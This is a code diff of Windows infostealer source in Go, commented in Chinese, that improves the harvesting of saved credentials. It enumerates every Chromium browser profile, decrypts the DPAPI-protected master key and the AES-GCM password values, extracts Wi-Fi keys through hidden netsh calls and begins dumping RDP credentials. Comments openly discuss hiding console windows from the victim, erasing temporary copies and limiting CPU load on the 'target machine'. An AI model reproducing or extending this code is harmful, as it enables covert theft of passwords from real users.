@@ -3,6 +3,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
@@ -10,10 +11,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
+	"sort"
 	"strings"
+	"sync"
+	"sync/atomic"
 	"time"
+	"unicode"
+	"unicode/utf16"
+	"unicode/utf8"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -124,338 +130,588 @@ func isPrintable(data []byte) bool {
 
 // ─── Browser Passwords ─────────────────────────────────────────────────────────
 
-// dumpBrowserPasswords 读取已保存的浏览器凭据
-// 支持 Chrome / Edge / Brave 等 Chromium 内核浏览器
-func dumpBrowserPasswords() ([]map[string]string, error) {
-	var results []map[string]string
+// browserCryptoStats 浏览器段的计数（打进该段 stats，真机验收时据此判断"没有垃圾"）。
+type browserCryptoStats struct {
+	mu sync.Mutex
+	m  map[string]int
+}
 
-	// 检测 Chrome / Edge / Brave 的 Login Data 路径
+var browserStats browserCryptoStats
+
+func (s *browserCryptoStats) reset() {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	s.m = make(map[string]int)
+}
+
+func (s *browserCryptoStats) inc(key string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	if s.m == nil {
+		s.m = make(map[string]int)
+	}
+	s.m[key]++
+}
+
+func (s *browserCryptoStats) snapshot() map[string]int {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	out := make(map[string]int, len(s.m))
+	for k, v := range s.m {
+		out[k] = v
+	}
+	return out
+}
+
+// chromiumBrowser 一个 Chromium 系浏览器的 User Data 目录。
+type chromiumBrowser struct {
+	name     string
+	userData string
+}
+
+// chromiumProfile 一个 profile（"Default" / "Profile 1" / "Profile 2" …）。
+type chromiumProfile struct {
+	name    string
+	loginDB string
+}
+
+// dumpBrowserPasswords 读取所有 Chromium 系浏览器、所有 profile 的已保存登录数据。
+//
+// 读取路径（不再手写 SQLite 解析）：
+//  1. 枚举 User Data/*/Login Data（多 profile，不只 Default）；
+//  2. 把 Login Data（连同可能存在的 -wal/-journal）复制到独立临时目录 —— 不直接
+//     打开正在被浏览器占用的库，避免锁冲突，也不改动用户数据；
+//  3. winsqlite3.dll 只读打开副本，SELECT origin_url, username_value,
+//     password_value FROM logins，由 SQLite 自己按 varint/serial type/overflow
+//     正确切列；
+//  4. 按 password_value 前缀分流解密（见 decryptChromiumPassword）：v10/v11 走
+//     AES-256-GCM，v20 明确标注"无法解密"，无前缀走老式 DPAPI；解不出来就留空
+//     并标注，绝不把密文/中间结果当密码输出；
+//  5. 丢弃 origin_url 为空或不像 URL 的行、丢弃 username 与 password 都为空的行，
+//     再按 (url, username, password) 去重；
+//  6. 无论成功失败都删除临时副本（含 -wal/-journal）。
+func dumpBrowserPasswords() ([]map[string]string, error) {
+	browserStats.reset()
+
 	localAppData := os.Getenv("LOCALAPPDATA")
 	if localAppData == "" {
 		localAppData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
 	}
-
-	browserPaths := []struct {
-		name string
-		path string
-	}{
-		{"Chrome", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
-		{"Edge", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
-		{"Brave", filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")},
+	browsers := []chromiumBrowser{
+		{name: "Chrome", userData: filepath.Join(localAppData, "Google", "Chrome", "User Data")},
+		{name: "Edge", userData: filepath.Join(localAppData, "Microsoft", "Edge", "User Data")},
+		{name: "Brave", userData: filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data")},
 	}
 
-	// 尝试读取 Chrome 主密钥 (Local State)
-	chromeMasterKey := ""
-	chromeUserData := filepath.Join(localAppData, "Google", "Chrome", "User Data")
-	masterKey, err := getChromeMasterKey(chromeUserData)
-	if err == nil {
-		chromeMasterKey = masterKey
-	}
-
-	for _, bp := range browserPaths {
-		browserResults, err := readChromiumPasswords(bp.name, bp.path, chromeMasterKey)
-		if err != nil {
+	var (
+		results  []map[string]string
+		firstErr error
+	)
+	for _, b := range browsers {
+		list := chromiumProfiles(b.userData)
+		if len(list) == 0 {
 			continue
 		}
-		results = append(results, browserResults...)
+		// 主密钥必须取**该浏览器自己的** Local State：Chrome 的 encrypted_key 解不开
+		// Edge 的 v10 密文（旧实现只取 Chrome 的 key 喂给所有浏览器，Edge 全解失败）。
+		key := chromiumMasterKey(b.userData)
+		for _, p := range list {
+			browserStats.inc("profiles")
+			entries, err := readChromiumProfile(b.name, p, key)
+			if err != nil {
+				browserStats.inc("profile_errors")
+				if firstErr == nil {
+					firstErr = err
+				}
+				continue
+			}
+			results = append(results, entries...)
+		}
 	}
+
+	results = dedupeBrowserEntries(results)
 
 	if len(results) == 0 {
-		return results, nil
+		// 一条都没拿到：winsqlite3 缺失/库损坏这类硬错误必须往上抛（该段标 error），
+		// 不能静默返回空列表让界面显示"0 条密码"。
+		if firstErr != nil {
+			return nil, firstErr
+		}
+		return []map[string]string{}, nil
 	}
-
 	return results, nil
 }
 
-// getChromeMasterKey 从 Chrome Local State 获取加密密钥
-func getChromeMasterKey(userDataPath string) (string, error) {
-	localStatePath := filepath.Join(userDataPath, "Local State")
-	data, err := os.ReadFile(localStatePath)
+// chromiumProfiles 枚举一个 User Data 目录下所有含 Login Data 的 profile 子目录。
+func chromiumProfiles(userDataDir string) []chromiumProfile {
+	entries, err := os.ReadDir(userDataDir)
 	if err != nil {
-		return "", err
+		return nil
 	}
+	var out []chromiumProfile
+	for _, e := range entries {
+		if !e.IsDir() {
+			continue
+		}
+		loginDB := filepath.Join(userDataDir, e.Name(), "Login Data")
+		fi, err := os.Stat(loginDB)
+		if err != nil || fi.IsDir() || fi.Size() == 0 {
+			continue
+		}
+		out = append(out, chromiumProfile{name: e.Name(), loginDB: loginDB})
+	}
+	// 稳定顺序：Default 优先，其余按名字排序（真机结果便于对照）。
+	sort.Slice(out, func(i, j int) bool {
+		if out[i].name == "Default" {
+			return true
+		}
+		if out[j].name == "Default" {
+			return false
+		}
+		return out[i].name < out[j].name
+	})
+	return out
+}
 
-	// 解析 JSON 获取 encrypted_key
-	var localState map[string]interface{}
+// chromiumMasterKey 从 <User Data>\Local State 取 os_crypt.encrypted_key：
+// base64 → 去 "DPAPI" 前缀 → CryptUnprotectData → AES 密钥（Chrome/Edge 为 32 字节）。
+// 取不到返回 nil（v10/v11 条目会标 decrypt-failed，而不是把密文当密码输出）。
+func chromiumMasterKey(userDataDir string) []byte {
+	data, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
+	if err != nil {
+		return nil
+	}
+	var localState struct {
+		OSCrypt struct {
+			EncryptedKey string `json:"encrypted_key"`
+		} `json:"os_crypt"`
+	}
 	if err := json.Unmarshal(data, &localState); err != nil {
-		return "", err
+		return nil
 	}
-
-	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
-	if !ok {
-		return "", fmt.Errorf("os_crypt not found")
+	if localState.OSCrypt.EncryptedKey == "" {
+		return nil
 	}
-
-	encKeyB64, ok := osCrypt["encrypted_key"].(string)
-	if !ok {
-		return "", fmt.Errorf("encrypted_key not found")
+	raw, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
+	if err != nil || len(raw) <= 5 || string(raw[:5]) != "DPAPI" {
+		return nil
 	}
-
-	// Base64 解码
-	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
+	key, err := decryptDPAPI(raw[5:])
 	if err != nil {
-		return "", err
+		return nil
 	}
-
-	// 去掉 "DPAPI" 前缀 (5 字节)
-	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
-		return "", fmt.Errorf("invalid DPAPI prefix")
-	}
-
-	encKey = encKey[5:]
-
-	// 使用 CryptUnprotectData 解密
-	decryptedKey, err := decryptDPAPI(encKey)
-	if err != nil {
-		return "", err
-	}
-
-	return string(decryptedKey), nil
+	return key
 }
 
-// readChromiumPasswords 读取 Chromium 浏览器的 Login Data SQLite 数据库
-func readChromiumPasswords(browserName, dbPath, masterKey string) ([]map[string]string, error) {
-	var results []map[string]string
-
-	// 检查文件是否存在
-	if _, err := os.Stat(dbPath); err != nil {
-		return nil, err
-	}
-
-	// 复制文件到临时路径（避免锁冲突），使用 copyFile 函数
-	tmpPath := filepath.Join(os.TempDir(), "toshell_"+browserName+"_LoginData.db")
-	err := copyFile(dbPath, tmpPath)
+// readChromiumProfile 读一个 profile：复制副本 → winsqlite3 只读查询 → 分流解密。
+func readChromiumProfile(browser string, p chromiumProfile, masterKey []byte) ([]map[string]string, error) {
+	dir, dbPath, err := copyLoginDataToTemp(p.loginDB)
 	if err != nil {
-		return nil, fmt.Errorf("复制Login Data失败: %v", err)
+		return nil, fmt.Errorf("%s/%s 复制 Login Data 失败: %v", browser, p.name, err)
 	}
-	defer os.Remove(tmpPath)
+	// 临时副本（含 -wal/-journal）用完必删：真机验收要求不在磁盘上留 Login Data 副本。
+	defer os.RemoveAll(dir)
 
-	// 读取 SQLite 数据库 - 直接读文件解析 SQLite 格式
-	entries, err := parseSQLiteLoginData(tmpPath)
+	rows, err := readChromiumLoginRows(dbPath)
 	if err != nil {
-		return nil, fmt.Errorf("解析Login Data失败: %v", err)
+		return nil, fmt.Errorf("%s/%s 解析 Login Data 失败: %v", browser, p.name, err)
 	}
 
-	for _, entry := range entries {
-		password := entry.password
-		// 尝试解密密码
-		if masterKey != "" && strings.HasPrefix(password, "v10") {
-			decrypted, err := decryptChromePassword(password, []byte(masterKey))
-			if err == nil {
-				password = decrypted
-			}
-		} else if strings.HasPrefix(password, "v10") || strings.HasPrefix(password, "v11") {
-			// 尝试 DPAPI 解密
-			decrypted, err := decryptDPAPI([]byte(password))
-			if err == nil {
-				password = decrypted
-			}
+	out := make([]map[string]string, 0, len(rows))
+	for _, row := range rows {
+		browserStats.inc("rows")
+		url := strings.TrimSpace(row.OriginURL)
+		username := strings.TrimSpace(row.Username)
+		if url == "" || !strings.Contains(url, "://") {
+			// 手写解析时 URL 里会混进字段名/接缝字节；不像 URL 的一律丢弃。
+			browserStats.inc("skipped_bad_url")
+			continue
 		}
 
-		results = append(results, map[string]string{
+		res := decryptChromiumPassword(row.Password, masterKey)
+		recordChromiumFailure(res)
+
+		if username == "" && res.password == "" {
+			browserStats.inc("skipped_empty")
+			continue
+		}
+
+		entry := map[string]string{
 			"type":     "browser",
-			"browser":  browserName,
-			"url":      entry.url,
-			"username": entry.username,
-			"password": password,
-		})
+			"browser":  browser,
+			"profile":  p.name,
+			"url":      url,
+			"username": username,
+			"password": res.password,
+			"scheme":   res.scheme,
+		}
+		if res.encrypted != "" {
+			entry["encrypted"] = res.encrypted
+		}
+		out = append(out, entry)
 	}
-
-	return results, nil
+	return out, nil
 }
 
-// sqliteLoginEntry SQLite 登录条目
-type sqliteLoginEntry struct {
-	url      string
-	username string
-	password string
-}
-
-// parseSQLiteLoginData 简单解析 SQLite 登录数据文件
-func parseSQLiteLoginData(filePath string) ([]sqliteLoginEntry, error) {
-	data, err := os.ReadFile(filePath)
+// copyLoginDataToTemp 把 Login Data 复制到新的临时目录，返回 (目录, 副本路径)。
+// 目标机上的浏览器可能正持有该库，直接读会撞锁，所以先复制再只读打开；
+// 目录由调用方在 SQLite 句柄关闭后 RemoveAll（Windows 上文件被打开时删不掉）。
+func copyLoginDataToTemp(src string) (string, string, error) {
+	dir, err := os.MkdirTemp("", "tsl_")
 	if err != nil {
-		return nil, err
+		return "", "", err
 	}
-	if len(data) < 100 {
-		return nil, fmt.Errorf("file too small")
+	dst := filepath.Join(dir, "login_data.db")
+	if err := copyFile(src, dst); err != nil {
+		os.RemoveAll(dir)
+		return "", "", err
 	}
-
-	// 验证 SQLite 文件头
-	if string(data[:16]) != "SQLite format 3\x00" {
-		return nil, fmt.Errorf("not a valid SQLite file")
-	}
-
-	var entries []sqliteLoginEntry
-
-	// 使用简单的字符串扫描方式提取 URL/用户名/密码
-	// 更可靠的方法：扫描文本字段
-	text := string(data)
-
-	// 搜索常见的 URL 模式
-	// 遍历数据，查找可打印字符串序列作为 HTTP URL
-	urlPattern := "http"
-	for i := 0; i < len(text)-len(urlPattern); i++ {
-		if text[i:i+4] == "http" {
-			// 提取 URL
-			end := i
-			for end < len(text) && end-i < 2048 {
-				b := text[end]
-				if b == 0 || b < 0x20 {
-					break
-				}
-				end++
-			}
-			if end > i+10 {
-				url := text[i:end]
-				// 查找附近可能的用户名和密码
-				entry := sqliteLoginEntry{url: url}
-
-				// 在 URL 之后搜索用户名/密码（通常存储在附近记录中）
-				// 简单的启发式方法：在 URL 后 2KB 范围内搜索
-				searchEnd := end + 2048
-				if searchEnd > len(text) {
-					searchEnd = len(text)
-				}
-
-				// 查找可能的用户名 (跟在URL之后的下一个非空字符串)
-				userFound := false
-				passFound := false
-				for j := end; j < searchEnd-1; j++ {
-					if text[j] == 0 {
-						continue
-					}
-					// 读取字符串
-					s := j
-					for s < searchEnd && text[s] >= 0x20 && text[s] < 0x7f && text[s] != 0 {
-						s++
-					}
-					if s > j+1 && s-j < 256 {
-						str := text[j:s]
-						// 跳过 URL、HTTP头、明显的非用户名
-						if strings.HasPrefix(str, "http") || strings.HasPrefix(str, "SQLite") {
-							j = s
-							continue
-						}
-						if !userFound && !strings.Contains(str, "://") {
-							entry.username = str
-							userFound = true
-							j = s
-							continue
-						}
-						if userFound && !passFound && len(str) > 2 {
-							entry.password = str
-							passFound = true
-							break
-						}
-					}
-					j = s
-				}
-
-				entries = append(entries, entry)
-				i = end // 跳过当前 URL
+	// 有未合并的 WAL/journal 时一起拷，读到的视图才和浏览器一致。
+	for _, suffix := range []string{"-wal", "-journal"} {
+		if fi, err := os.Stat(src + suffix); err == nil && !fi.IsDir() {
+			if err := copyFile(src+suffix, dst+suffix); err != nil {
+				os.RemoveAll(dir)
+				return "", "", err
 			}
 		}
 	}
-
-	return entries, nil
+	return dir, dst, nil
 }
 
-// decryptChromePassword 使用 Chrome 主密钥解密密码 (AES-256-GCM, v10格式)
-func decryptChromePassword(encrypted string, key []byte) (string, error) {
-	if !strings.HasPrefix(encrypted, "v10") && !strings.HasPrefix(encrypted, "v11") {
-		return "", fmt.Errorf("unsupported version")
+// recordChromiumFailure 按失败原因累加该段统计（统计里给 undecryptable_v20 计数）。
+func recordChromiumFailure(res chromiumCryptoResult) {
+	switch res.reason {
+	case "v20":
+		browserStats.inc("undecryptable_v20")
+	case "no-key":
+		browserStats.inc("no_master_key")
+	case "bad-utf8":
+		browserStats.inc("bad_utf8")
+	case "decrypt-failed":
+		browserStats.inc("decrypt_failed")
 	}
+}
 
-	encBytes := []byte(encrypted[3:]) // 跳过 "v10" 或 "v11"
-
-	// Chrome v10 格式: nonce(12) || ciphertext || tag(16)
-	if len(encBytes) < 12+16 {
-		return "", fmt.Errorf("encrypted data too short")
+// dedupeBrowserEntries 同一 (url, username, password) 只留第一条。
+func dedupeBrowserEntries(entries []map[string]string) []map[string]string {
+	seen := make(map[string]struct{}, len(entries))
+	out := entries[:0]
+	for _, e := range entries {
+		key := e["url"] + "\x00" + e["username"] + "\x00" + e["password"]
+		if _, ok := seen[key]; ok {
+			browserStats.inc("deduped")
+			continue
+		}
+		seen[key] = struct{}{}
+		out = append(out, e)
 	}
+	return out
+}
 
-	nonce := encBytes[:12]
-	ciphertext := encBytes[12:]
+// chromiumCryptoResult 单条 password_value 的解密结果。
+//
+//	password  解出来的明文（失败时为空 —— 绝不输出密文/中间结果）
+//	scheme    v10 / v11 / v20 / dpapi（空 = 该行没有 password_value）
+//	encrypted 失败时给界面看的标注（成功为空）
+//	reason    内部计数用（"" = 成功）
+type chromiumCryptoResult struct {
+	password  string
+	scheme    string
+	encrypted string
+	reason    string
+}
 
+// decryptChromiumPassword 按 password_value 前缀分流（前缀决定算法，绝不能混用）：
+//
+//	v10 / v11  AES-256-GCM：12 字节 nonce + 密文 + 16 字节 tag，密钥来自该浏览器
+//	           Local State 的 os_crypt.encrypted_key（DPAPI 保护）；
+//	v20        Chrome/Edge 127+ 的 App-Bound Encryption：密钥由系统服务按"应用身份"
+//	           绑定，当前权限解不开 —— 必须明确标注，且一个字节都不输出；
+//	无前缀     老式整块 DPAPI（CryptUnprotectData）。
+//
+// 任何失败分支都返回空 password + encrypted 标注；解出来的字节必须通过 UTF-8 与
+// 控制字符校验，否则按"解密失败"处理（旧实现把 string(密文) 直接当密码输出，
+// 真机上那些 "=Qa"、"?%#%5" 就是这么来的）。
+func decryptChromiumPassword(raw []byte, masterKey []byte) chromiumCryptoResult {
+	if len(raw) == 0 {
+		return chromiumCryptoResult{}
+	}
+	switch {
+	case bytes.HasPrefix(raw, []byte("v20")):
+		return chromiumCryptoResult{
+			scheme:    "v20",
+			encrypted: "v20 (app-bound, 无法解密)",
+			reason:    "v20",
+		}
+	case bytes.HasPrefix(raw, []byte("v10")), bytes.HasPrefix(raw, []byte("v11")):
+		scheme := string(raw[:3])
+		if len(masterKey) == 0 {
+			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "no-key"}
+		}
+		plain, err := decryptChromiumGCM(raw[3:], masterKey)
+		if err != nil {
+			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "decrypt-failed"}
+		}
+		password, ok := validateChromiumPlaintext(plain)
+		if !ok {
+			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "bad-utf8"}
+		}
+		return chromiumCryptoResult{password: password, scheme: scheme}
+	default:
+		plain, err := decryptDPAPI(raw)
+		if err != nil {
+			return chromiumCryptoResult{scheme: "dpapi", encrypted: "decrypt-failed", reason: "decrypt-failed"}
+		}
+		password, ok := validateChromiumPlaintext(plain)
+		if !ok {
+			return chromiumCryptoResult{scheme: "dpapi", encrypted: "decrypt-failed", reason: "bad-utf8"}
+		}
+		return chromiumCryptoResult{password: password, scheme: "dpapi"}
+	}
+}
+
+// decryptChromiumGCM 解 v10/v11：payload = nonce(12) || ciphertext || tag(16)。
+func decryptChromiumGCM(payload, key []byte) ([]byte, error) {
+	if len(payload) < 12+16 {
+		return nil, fmt.Errorf("密文过短: %d 字节", len(payload))
+	}
+	nonce := payload[:12]
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
-
-	aesgcm, err := cipher.NewGCM(block)
+	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
-
-	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return "", err
-	}
-
-	return string(plaintext), nil
+	return gcm.Open(nil, nonce, payload[12:], nil)
 }
+
+// validateChromiumPlaintext 把解密结果转成"可以展示的密码"，或判定为垃圾。
+func validateChromiumPlaintext(plain []byte) (string, bool) {
+	return decodeTextBlob(plain)
+}
+
+// decodeTextBlob 把"可能是 UTF-8，也可能是 UTF-16LE"的明文字节转成字符串。
+//
+// 判据（口令明文里正常不会有 NUL 字节）：
+//   - NUL 主要落在奇数位 = UTF-16LE 的高字节（ASCII 口令的特征）→ 按 UTF-16LE 解；
+//   - 否则按 UTF-8（去掉尾部 NUL，老 Chromium 的 DPAPI 段会带 C 字符串终止符）；
+//   - UTF-8 非法且完全没有 NUL（纯 CJK 的 UTF-16LE 就没有 NUL）→ 再试一次 UTF-16LE；
+//   - 都不成立返回 false：调用方据此标 decrypt-failed 并留空，**绝不输出垃圾字节**。
+func decodeTextBlob(b []byte) (string, bool) {
+	if len(b) == 0 {
+		return "", true
+	}
+	evenNUL, oddNUL := countNULParity(b)
+	if oddNUL > evenNUL {
+		return decodeUTF16LEStrict(b)
+	}
+	if utf8.Valid(b) {
+		return printableString(bytes.TrimRight(b, "\x00"))
+	}
+	if evenNUL == 0 && oddNUL == 0 {
+		if s, ok := decodeUTF16LEStrict(b); ok && plausibleDecodedText(s) {
+			return s, true
+		}
+	}
+	return "", false
+}
+
+// plausibleDecodedText 兜底路径（无 NUL 的 UTF-16LE）的合理性闸门：
+// 拒绝 BOM / U+FFFD / 控制字符，并要求至少 3/4 的码位是可打印文字或标点。
+// 目的：宁可把一条罕见口令标成 decrypt-failed，也绝不把随机字节当密码输出。
+func plausibleDecodedText(s string) bool {
+	if s == "" {
+		return false
+	}
+	total, good := 0, 0
+	for _, r := range s {
+		total++
+		switch {
+		case r == '\ufeff' || r == '\ufffd':
+			return false
+		case r == '\t':
+			good++
+		case unicode.IsLetter(r) || unicode.IsDigit(r) || unicode.IsPunct(r) || unicode.IsSymbol(r):
+			good++
+		}
+	}
+	return total > 0 && good*4 >= total*3
+}
+
+// countNULParity 统计偶数位 / 奇数位上的 NUL 个数（UTF-16LE 的高字节在奇数位）。
+func countNULParity(b []byte) (even, odd int) {
+	for i := 0; i < len(b); i++ {
+		if b[i] != 0 {
+			continue
+		}
+		if i%2 == 0 {
+			even++
+		} else {
+			odd++
+		}
+	}
+	return even, odd
+}
+
+// decodeUTF16LEStrict 严格按 UTF-16LE 解码：拒绝非法代理项、内嵌 NUL 码元与不可打印字符。
+func decodeUTF16LEStrict(b []byte) (string, bool) {
+	// 先去掉末尾的 0x0000 终止符码元（UTF-16 的 C 字符串终止符），
+	// 否则 "RdpPass!\x00\x00" 会被当成"内嵌 NUL"而整条丢弃。
+	for len(b) >= 2 && b[len(b)-2] == 0 && b[len(b)-1] == 0 {
+		b = b[:len(b)-2]
+	}
+	if len(b)%2 != 0 {
+		// ASCII 末字符的高字节 0x00 单独出现不构成完整码元，去掉它。
+		if b[len(b)-1] != 0 {
+			return "", false
+		}
+		b = b[:len(b)-1]
+	}
+	if len(b) < 2 {
+		return "", true
+	}
+	u := make([]uint16, 0, len(b)/2)
+	for i := 0; i+1 < len(b); i += 2 {
+		c := uint16(b[i]) | uint16(b[i+1])<<8
+		if c == 0 {
+			return "", false
+		}
+		u = append(u, c)
+	}
+	return printableString([]byte(string(utf16.Decode(u))))
+}
+
+// printableString 校验 UTF-8 合法且不含控制字符（除 TAB），去掉 U+FFFD。
+func printableString(b []byte) (string, bool) {
+	if !utf8.Valid(b) {
+		return "", false
+	}
+	s := string(b)
+	for _, r := range s {
+		if r == utf8.RuneError || (r < 0x20 && r != '\t') || r == 0x7f {
+			return "", false
+		}
+	}
+	return s, true
+}
+
+// 说明：这里原先有一个"简单解析 SQLite 登录数据文件"的手写解析器
+// （parseSQLiteLoginData）和配套的 v10 解密器（decryptChromePassword），两者都已删除：
+//
+//   - 手写解析 = 在文件里扫 "http" 开头的可打印串，再把"URL 后面 2KB 内的下一个字符串"
+//     猜成用户名/密码。SQLite 的列边界只存在于 b-tree cell 记录头的 serial type 序列里，
+//     跳过它意味着拿到的字节必然跨记录/跨页：真机上 password 因此变成
+//     "tablelogins_edge_extendedlogins_edge_extended"（schema 文本）、url 变成
+//     ".../ui/login.phpadmin"（下一条记录的 username 接上来）。这种解析无论怎么调启发式
+//     都不可能正确，所以改走系统自带 winsqlite3.dll（见 sqlite_windows.go）。
+//   - 解密器只有一个"v10 前缀 + 主密钥"分支，v11/v20/无前缀全落到 DPAPI 或原样输出，
+//     于是把密文/中间结果当密码显示。现在统一走 decryptChromiumPassword 的三分支。
 
 // ─── WiFi Passwords ─────────────────────────────────────────────────────────────
 
-// dumpSavedWiFi 读取已保存的 WiFi 密码
+// dumpSavedWiFi 读取已保存的 WiFi 密码。
+//
+// 两个真机问题都在这里修掉：
+//   - 黑框：netsh 是控制台程序，裸 exec.Command 会在目标机桌面闪一个控制台窗口
+//     （用户一眼就看到，等于自曝）；现在统一走 execHidden（HideWindow +
+//     CREATE_NO_WINDOW，见 exec_hidden_windows.go）。
+//   - 乱码/空条目：中文系统上 netsh 输出是 GBK 字节，直接 string(out) 得到的
+//     "所有用户配置文件 / 关键内容" 永远匹配不上（还会把乱码当 SSID 输出）；现在
+//     统一过 decodeConsoleText（platform_windows.go：逐行判 UTF-8，非 UTF-8 按
+//     GBK→UTF-8 转）。
 func dumpSavedWiFi() ([]map[string]string, error) {
-	var results []map[string]string
-
-	// 获取所有 WiFi 配置文件
-	cmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profiles")
-	output, err := cmd.CombinedOutput()
-	if err != nil {
+	out, err := execHidden(sysBin("netsh.exe"), "wlan", "show", "profiles").CombinedOutput()
+	if err != nil && len(out) == 0 {
 		return nil, fmt.Errorf("执行 netsh wlan show profiles 失败: %v", err)
 	}
+	profiles := parseWlanProfileNames(decodeConsoleText(string(out)))
 
-	outStr := string(output)
-	// 解析输出，提取 SSID
-	lines := strings.Split(outStr, "\n")
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
+	results := make([]map[string]string, 0, len(profiles))
+	seen := make(map[string]struct{}, len(profiles))
+	for _, ssid := range profiles {
+		ssid = strings.TrimSpace(ssid)
+		if ssid == "" {
+			continue
+		}
+		if _, dup := seen[ssid]; dup {
+			continue
+		}
+		seen[ssid] = struct{}{}
 
-		// 查找 "All User Profile     : XXX"
-		if strings.Contains(line, ":") {
-			parts := strings.SplitN(line, ":", 2)
-			if len(parts) == 2 {
-				key := strings.TrimSpace(parts[0])
-				val := strings.TrimSpace(parts[1])
+		passOut, err := execHidden(sysBin("netsh.exe"),
+			"wlan", "show", "profile", "name="+ssid, "key=clear").CombinedOutput()
+		if err != nil && len(passOut) == 0 {
+			continue
+		}
+		password := parseWlanKeyContent(decodeConsoleText(string(passOut)))
+		if password == "" {
+			// 开放网络/没有保存密钥：跳过，不产出空条目（旧实现会刷一堆空 password）。
+			continue
+		}
+		results = append(results, map[string]string{
+			"type":     "wifi",
+			"ssid":     ssid,
+			"password": password,
+		})
+	}
+	return results, nil
+}
 
-				if strings.Contains(key, "All User Profile") || strings.Contains(key, "所有用户配置文件") {
-					if val == "" {
-						continue
-					}
-
-					ssid := val
-					password := ""
-
-					// 获取该 SSID 的密码
-					passCmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profile", "name="+ssid, "key=clear")
-					passOutput, passErr := passCmd.CombinedOutput()
-					if passErr == nil {
-						passStr := string(passOutput)
-						passLines := strings.Split(passStr, "\n")
-						for _, pl := range passLines {
-							pl = strings.TrimSpace(pl)
-							if strings.Contains(pl, "Key Content") || strings.Contains(pl, "关键内容") {
-								if pParts := strings.SplitN(pl, ":", 2); len(pParts) == 2 {
-									password = strings.TrimSpace(pParts[1])
-								}
-							}
-						}
-					}
-
-					results = append(results, map[string]string{
-						"type":     "wifi",
-						"ssid":     ssid,
-						"password": password,
-					})
-				}
+// parseWlanProfileNames 从 `netsh wlan show profiles` 输出里取 SSID。
+//
+// 只认 "All User Profile" / "所有用户配置文件" 两种标签；`Profile / 配置文件 /
+// 用户配置文件 / 配置文件类型 / User profile` 这些行在英文/中文输出里都会出现，
+// 必须跳过 —— 否则会把 "User profile" 这类说明文字当成 SSID 去查密钥。
+func parseWlanProfileNames(text string) []string {
+	var out []string
+	for _, line := range strings.Split(text, "\n") {
+		key, val, ok := splitConsoleKV(strings.TrimSpace(line))
+		if !ok {
+			continue
+		}
+		switch key {
+		case "All User Profile", "所有用户配置文件":
+			if val != "" {
+				out = append(out, val)
 			}
 		}
 	}
+	return out
+}
 
-	return results, nil
+// parseWlanKeyContent 从 `netsh wlan show profile ... key=clear` 输出里取密码，
+// 只取 `Key Content` / `关键内容` 冒号后面的值。
+func parseWlanKeyContent(text string) string {
+	for _, line := range strings.Split(text, "\n") {
+		key, val, ok := splitConsoleKV(strings.TrimSpace(line))
+		if !ok {
+			continue
+		}
+		switch key {
+		case "Key Content", "关键内容":
+			return strings.TrimSpace(val)
+		}
+	}
+	return ""
+}
+
+// splitConsoleKV 把 "标签 : 值" 拆成 (标签, 值)；同时接受全角冒号。
+func splitConsoleKV(line string) (string, string, bool) {
+	line = strings.TrimSpace(line)
+	idx := strings.Index(line, ":")
+	if full := strings.Index(line, "："); full >= 0 && (idx < 0 || full < idx) {
+		idx = full
+	}
+	if idx <= 0 {
+		return "", "", false
+	}
+	key := strings.TrimSpace(line[:idx])
+	if key == "" {
+		return "", "", false
+	}
+	return key, strings.TrimSpace(line[idx+1:]), true
 }
 
 // ─── RDP Credentials ────────────────────────────────────────────────────────────
@@ -491,25 +747,81 @@ const (
 	CRED_MAX_GENERIC_TARGET_NAME_LENGTH = 32767
 )
 
-// dumpRDPCredentials 使用 CredEnumerateW 读取保存的 RDP 凭据
+// rdpTimings RDP 段的**分阶段耗时**（打进该段 timings）。
+//
+// 用户反馈"rdp 获取时间 200 过长"，必须先量准再改：这里把 CredEnumerateW 本身
+// （系统侧枚举整个凭据库）和逐条后处理（UTF-16 转码 / 必要的 CredReadW）分开计时，
+// 再据此决定优化方向，而不是为了数字好看去砍字段。
+type rdpTimings struct {
+	mu sync.Mutex
+	m  map[string]int64
+}
+
+var rdpTimingStats rdpTimings
+
+func (t *rdpTimings) reset() {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+	t.m = make(map[string]int64)
+}
+
+func (t *rdpTimings) set(k string, v int64) {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+	if t.m == nil {
+		t.m = make(map[string]int64)
+	}
+	t.m[k] = v
+}
+
+func (t *rdpTimings) snapshot() map[string]int64 {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+	out := make(map[string]int64, len(t.m))
+	for k, v := range t.m {
+		out[k] = v
+	}
+	return out
+}
+
+// rdpWorkerLimit 逐条后处理的并发上限（CredReadW 是系统调用；4 路足够掩盖单条延迟，
+// 又不会在目标机上制造明显的句柄/CPU 抖动）。
+const rdpWorkerLimit = 4
+
+// dumpRDPCredentials 使用 CredEnumerateW 读取保存的 RDP / 凭据管理器条目。
+//
+// 耗时结构（真机实测数字见交付报告）：
